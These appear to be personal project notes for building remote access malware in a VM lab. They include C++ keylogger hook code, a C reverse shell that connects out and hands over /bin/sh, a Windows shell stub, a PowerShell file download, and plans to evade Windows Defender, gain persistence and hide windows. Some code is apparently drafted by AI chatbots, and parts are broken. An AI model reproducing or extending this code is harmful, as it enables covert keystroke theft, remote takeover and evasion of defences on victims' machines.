
TODO:
- Investigate how windows security handles keylogger.exe 
- What folder should the revshell be installed in. 

**Easy stuff with low prio to fix:**
- Reading the ip address from file
- A smoother way to compile revshell.exe, can include it in the make? 
- Structure the .ddl .o and other files in folders. 




**Current state of the program and relevant questions:** 
1. Evade windows defender 
2. Make the reverse shell persistent 
3. Install keylogger via script 

DLL's dependencies :
- libgcc_s_seh-1.dll
- libstdc++-6.dll
- libwinpthread-1.dll


**Characters it can not log currently:**
- §, ¤, £
- TAB and ENTER looks similar, might want to print it out explicitly. 
- Red-box-notation: Backspace, ESC


**Observations:**
- When i run the revshell, and find a connection. i can interact with the shell of the from my kali. AND i still lets me interact with the shell when i stop running the revshell from my windows? BUT if i stop the listening on my kali, then the execution stops on my windows. 
- I can start the listening from Kali before OR after running the revshell.exe -> This is good.
- Possible error when: I am connected to the shell, then stop revshell.exe -> I still have revshell on the windows computer. BUT when i execute the revshell.exe again i get an error? -> Not big problem since i still have revshell, but is still weird and messy.
- The reverseshell process, which basically is a powershell process is visible in the task manager. 
- Revshell.exe does not get flagged on my windows host machine, even with defender on?  



**Common errors i make:**
- compiling the reverseShell: 
```
gcc -o backup backup.c -lws2_32 
```



**Example of existing RATs**: NjRAT, Blackshades.

Potential Functionalities:
- **Remote shell:**
- **Allow file transfer** between attacker(KALI VM) and the target windows VM. Both download and upload. Can be over FTP, HTTP, or TCP(prop a bit more work).
- **Screen capture:** Livestreaming the screen of the target, can be done with windows API such as BitBlt(), GetWindowsRect(), GetForegroundWindow(), ....
- Keyboard and mouse control: Attacker can send keystrokes and control mouse cursor on target system remote. 
- Log mouse inputs.  
- Anti-detection features:  rootkit? -> persistent across reboot 
- Network proxy: Attacker can route traffic through infected target and hide their IP.

Networking in the Oracle Lab: KALI, Lab and Target need to talk to each other. 
- Can do **Bridget networking**: VMs unique IPs and allows them to communicate directly with the host computer network interface. 
- Can do **NAT networking**: Private IP addresses to the VMs and routes traffic through a shared virtual network adapter on the host machine.  
- May need to modify firewall settings on each VM to allow desired communication. 

General: 
- Think about what can happen if something spread to the Host computer.
- Time sync. between the VMs can use useful to prevent bugs. Use ntpdate(KALI) og w32tm / resync (Windows).
- Use snapshots of VMs when deploying malware.
- Problems with executing such program in Windows 10? Does defender block such execution? 


#### Keylogger: 

There are different categories of keylogger. Our version falls in the API-Based category.

Save all keystrokes made on a system and save them in a nicely formatted matter in a .txt file with date. It is designed to work in Windows, and by nature is not cross platform. When we have managed to save normal keystrokes, we need to encrypt the content of the .txt file containing the key logs. 

C++ vs PowerShell: C++ preforms better, and has better control over system resources. But PowerShell is a bit "simpler" to develop. Since I have more experience with C++, I clearly preferer to use it over PS:   

**Research:**
- Different ways we can capture keyboard input on windows. 
- Event handling: Register and handle global keyboard events using Windows API, may need to use low-level keyboard hooks (?), SetWindowsHookEx() or RegisterRawInputDevices(). 
- Data structure for saving keystrokes to file:  Asynchronous I/O operation WriteFile()? Better to write to file in large chunks, helps reduce number of times I/O functions is called. 
- Error handling: What to do if the program faile to read a keystroke? What happens when the user turns of the system? -> If program cannot record the keystroke, have expiation handling. 
- Getting around security features in Windows 10: Sign the executable with valid code-signing certification to prove it is legit. Can help bypass SmartScreen Warnings when user try to run it. Other: Can use packaging tool, more? 
![[Pasted image 20240530164344.png]]
- Hookchains: The callback function in SetWindowsHookEx() returns a call to CallNextHookEx(). Not sure how this works, or why we care. -> functionality gets broken? Basically, since we are intercepting the keystrokes as raw data before any other part of the system, not calling the next hook, may result in other parts of the system to not get access to the keyinput. Returning CallNextHookEx() ensures normal functionality. 


Global keyboard events: We need to capture all keystrokes that happen on the computer, even if the target user is not interacting with any specific program or interface. To be able to do this, we need  **Hooks**.

Hooks: lets us intercept raw keyboard input data before it is processed by the operating system or any other application. Ensures that we are capturing ALL keyboard events 

**From ollama-dolphin:**

Here's an example of how you can use the `SetWindowsHookEx()` function to install a low-level
keyboard hook in C++:

```cpp
HHOOK hhk = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKCB)KeyboardHookCallback, NULL, 0);
if (hhk == NULL) {
    // Handle error
}
```

In this example, `KeyboardHookCallback()` is the name of the hook proc callback function that processes the captured keyboard events. You need to define this function in your code and handle the appropriate keyboard event messages (e.g., `WM_KEYDOWN`, `WM_KEYUP`) by using the `lParam` parameter of the `KeyboardHookCallback()` function, which contains information about the
captured keystrokes.

Remember that you also need to uninstall your hook by calling the `UnhookWindowsHookEx()`
function when your keylogger is no longer running or needs to be removed from the system:

```cpp
if (hhk != NULL) {
    UnhookWindowsHookEx(hhk);
}
```



Function breakdown:
```c
HHOOK SetWindowsHookEx(
  int       idHook,
  HOOKPROC  lpfn,
  HINSTANCE hMod,
  DWORD     dwThreadId
);
```

The function return a variable of type HHOOK, which is a **Handle** to the hook procedure. 

When the hook is installed on the system, and if it is configured to listens to keyboard strokes, then the callback function "lpfn" is called each time a key is pressed. 


- idHook: Specifies the type of hook to be installed.
- lpfn: **Long pointer to a function** ,  a callback function that will be called when the specified events occur. Parameter that expects a pointer to a hook procedure. This function is user defined, but must adhere to specific signatures defined by the type of hook being set. The return type of this function depend on the idHook parameter. 
- hMod: Handel to the DLL containing the hook procedure pointed to by "lpfn".
- dwThreadId: Identifier of the thread with which the hook procedure is to be associated. If parameter is: 0; then the hook procedure is associated with all existing threads.

Draft from Gpt-4o:
```c
#include <windows.h>

HHOOK hHook = NULL;

// Hook procedure for keyboard events
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) { // nCode >= 0 means a key event is being processed
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
            DWORD vkCode = kbdStruct->vkCode;
            // Handle the key press (e.g., log it, modify it, etc.)
            // For demonstration, let's just output the key code
            printf("Key Pressed: %d\n", vkCode);
        }
    }
    // Call the next hook in the chain
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    // Install the hook
    hHook = SetWindowsHookEx(
, KeyboardProc, NULL, 0);
    if (hHook == NULL) {
        printf("Failed to install hook!\n");
        return 1;
    }

    // Keep the application running to listen for events
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook the hook when done
    UnhookWindowsHookEx(hHook);

    return 0;
}
```


**Hook procedure:**
When we use SetWindowsHookExW(), one of the parameters in the function is the callback function that will be executed. This function is user defined, but always follows the same template.   

```c
LRESULT CALLBACK name_of_the_callbackfunction (int nCode, WPARAM wParam, LPARAM lParam)
```


- nCode: An int value, the hook uses it to determine how to process the message.  
- wPram: Specifies the type of keyboard event, WM_KEYDOWN etc..
- lParam: Points to a struct (KBDLLHOOKSTRUCT) that contains more info about the event.  We can use the time value in our keylogger. 

```c
typedef struct tagKBDLLHOOKSTRUCT {
    DWORD vkCode;      // Virtual key code
    DWORD scanCode;    // Hardware scan code
    DWORD flags;       // Event-injected flags
    DWORD time;        // Timestamp for the event
    ULONG_PTR dwExtraInfo; // Extra information
} KBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;
```


**Message loop:**
Processes messages sent to a application by the operating system. Each thread that creates a windows has its own message queue.  The messages in the message queue contain information about keystrokes, mouse movements and other events. 

Purpose of the message loop:
Retrieve messages from the threads message queue and dispatches them to the appropriate window procedures for handling. 

**GetMessage**(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax)

- lpMsg: Pointer to Msg struct, revives message information from the threads message queue. 
- hWnd
- wMsgFilterMin
- wMsgFilterMax


**Messages and events:** gpt-4o
### Events and Messages

1. **Events Intercepted by Hooks**:
    
    - **Low-Level Events**: Hooks can intercept low-level events, such as keystrokes or mouse movements, before they are processed by the system or any application. These events are handled by low-level hooks, like `WH_KEYBOARD_LL` and `WH_MOUSE_LL`.
    - **Hook Procedures**: When you install a hook, you provide a hook procedure (callback function) that gets called whenever the specified event occurs. For example, a keyboard hook procedure might get called whenever a key is pressed or released.
2. **Messages in the Message Queue**:
    
    - **High-Level Messages**: The message queue contains high-level messages that are sent to a window or thread by the operating system. These messages include things like `WM_KEYDOWN`, `WM_KEYUP`, `WM_MOUSEMOVE`, and many other window messages.
    - **Message Processing**: The message loop (`GetMessage`, `TranslateMessage`, `DispatchMessage`) retrieves messages from the message queue and sends them to the appropriate window procedure for processing.

### How They Relate and Interact

1. **Event Flow with Hooks**:
    
    - **Interception**: When a low-level event (e.g., a key press) occurs, the hook intercepts it before it becomes a high-level message.
    - **Processing in Hook Procedure**: The hook procedure processes the event. This can include modifying the event, logging it, or performing any other desired action.
    - **Passing to Next Hook**: The hook procedure usually calls `CallNextHookEx` to pass the event to the next hook in the chain or let the system continue processing it.
2. **Message Flow in the Message Queue**:
    
    - **Event to Message**: After the hook procedures (if any) have processed the event, it is converted into a high-level message (e.g., `WM_KEYDOWN`) and placed in the message queue of the thread that owns the window receiving the message.
    - **Message Retrieval**: The message loop retrieves these messages from the queue using `GetMessage`.
    - **Message Translation and Dispatching**: `TranslateMessage` translates virtual-key messages to character messages, and `DispatchMessage` sends the message to the window procedure for handling.

### Example Scenario: Key Press Event

1. **Key Press Event**:
    
    - A key is pressed on the keyboard.
2. **Hook Interception**:
    
    - A low-level keyboard hook (`WH_KEYBOARD_LL`) intercepts the key press event.
    - The hook procedure (`KeyboardProc`) is called with details about the key press.
    - The hook procedure can log the key press, modify it, or block it. After processing, it calls `CallNextHookEx`.
3. **Message Generation**:
    
    - After all hooks have processed the event, the system generates a `WM_KEYDOWN` message and places it in the message queue of the appropriate thread.
4. **Message Loop Processing**:
    
    - The message loop (`GetMessage`, `TranslateMessage`, `DispatchMessage`) retrieves the `WM_KEYDOWN` message from the queue.
    - `TranslateMessage` converts virtual-key messages to character messages if necessary.
    - `DispatchMessage` sends the message to the window procedure for the window that is supposed to receive the key press.
5. **Window Procedure Handling**:
    
    - The window procedure processes the `WM_KEYDOWN` message, updating the application state, UI, or triggering actions based on the key press.

### Summary

- **Events Intercepted by Hooks**: Low-level, system-wide events like key presses and mouse movements. Hooks allow you to intercept and process these events before they become high-level messages.
- **Messages in the Message Queue**: High-level messages (like `WM_KEYDOWN`) that are processed by the message loop and sent to window procedures. These messages represent processed events ready for application handling.

The message loop ensures continuous message processing, which is essential for both handling high-level messages and maintaining active hooks. Hooks and message queues work together to manage how low-level events are processed and delivered to applications.


**Virtual code and unicode:**

When we get input from the keyboard, the hook gets it in a virtual key code format. Since we want to read what has been typed as normal letters, we have to translate it to unicode. 

```
int ToUnicode(
  [in]           UINT       wVirtKey,
  [in]           UINT       wScanCode,
  [in, optional] const BYTE *lpKeyState,
  [out]          LPWSTR     pwszBuff,
  [in]           int        cchBuff,
  [in]           UINT       wFlags
);
```

- wVirtKey:
- wScanCode:
- lpKeyState:
- pwszBuff:
- cchBuff:
- wFlags:

The function return an int, which in practice is a status code of the translation: 
- value < 0: Specified vk is a dead key character. 
- value = 0: Specified vk has no translation for the current state of the keyboard. 
- value > 0: One or more UTF-16 code units where written to the buffer specified by pwszBuff. 



### Reverse shell: on Linux 

```c
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>

#define SERVER_IP "192.0.2.1" // Replace with the IP address of your server
#define SERVER_PORT 443       // Replace with a non-standard port number

int main(int argc, char *argv[]) {
    int sockfd;
    struct sockaddr_in serv_addr;

    if (argc < 2) {
        fprintf(stderr, "Usage: %s [listen|connect]\n", argv[0]);
        return 1;
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("ERROR opening socket");
        return 1;
    }

    memset(&serv_addr, '0', sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(SERVER_PORT);

    if (strcmp(argv[1], "connect") == 0) {
        if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            perror("ERROR connecting");
            return 1;
        }
    } else if (strcmp(argv[1], "listen") == 0) {
        if (bind(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            perror("ERROR on binding");
            return 1;
        }

        listen(sockfd, 5);

        int new_sock;
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);

        if ((new_sock = accept(sockfd, (struct sockaddr *)&client_addr, &client_len)) < 0) {
            perror("ERROR on accept");
            return 1;
        }
    } else {
        fprintf(stderr, "Invalid argument: %s\n", argv[1]);
        return 1;
    }

    if (dup2(sockfd, STDIN_FILENO) < 0) {
        perror("ERROR on duplicating stdin");
        return 1;
    }

    if (dup2(sockfd, STDOUT_FILENO) < 0) {
        perror("ERROR on duplicating stdout");
        return 1;
    }

    if (dup2(sockfd, STDERR_FILENO) < 0) {
        perror("ERROR on duplicating stderr");
        return 1;
    }

    close(sockfd);

    char *executable = "/bin/sh";
    char **argv = NULL;

    if (execve(executable, argv, NULL) < 0) {
        perror("ERROR executing shell");
        return 1;
    }

    return 0;
}
```



### Reverse shell on windows (using HTTP)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wininet.h>
#pragma comment(lib, "wininet")

char* WINDOWS_SHELL = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
char* ARGUMENT = "-Command $env:COMPUTERNAME; $cmd = 'Get-Content env:computername'; $cmd";

int main() {
    HINTERNET hInternet = InternetOpenA("WinHTTP", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("Error: Failed to open internet connection.\n");
        return -1;
    }

    HINTERNET hHttpRequest = InternetOpenUrlA(hInternet, "http://example.com/", NULL, 0,
INTERNET_FLAG_RELOAD, 0);
    if (hHttpRequest == NULL) {
        printf("Error: Failed to open HTTP connection.\n");
        return -1;
    }

    char* output = (char*)malloc(sizeof(char) * 512);
    DWORD bytes_read;

    if (!InternetReadFile(hHttpRequest, output, sizeof(output), &bytes_read)) {
        printf("Error: Failed to read HTTP response.\n");
        return -1;
    }

    printf("%s\n", output);

    system(WINDOWS_SHELL );

    if (!InternetCloseHandle(hHttpRequest)) {
        printf("Warning: Failed to close HTTP connection.\n");
    }

    if (!InternetCloseHandle(hInternet)) {
        printf("Warning: Failed to close internet connection.\n");
    }

    return 0;
}
```


Sending over files via HTTP: Linux to Windows: 
```ps1
Invoke-WebRequest -Uri http://192.168.56.101:8000/test.txt -OutFile test.txt
```


Compile reverse shell without showing terminal:
``` ps1
g++ reverseShell.c -o reverseShell.exe -lws2_32 -mwindows
```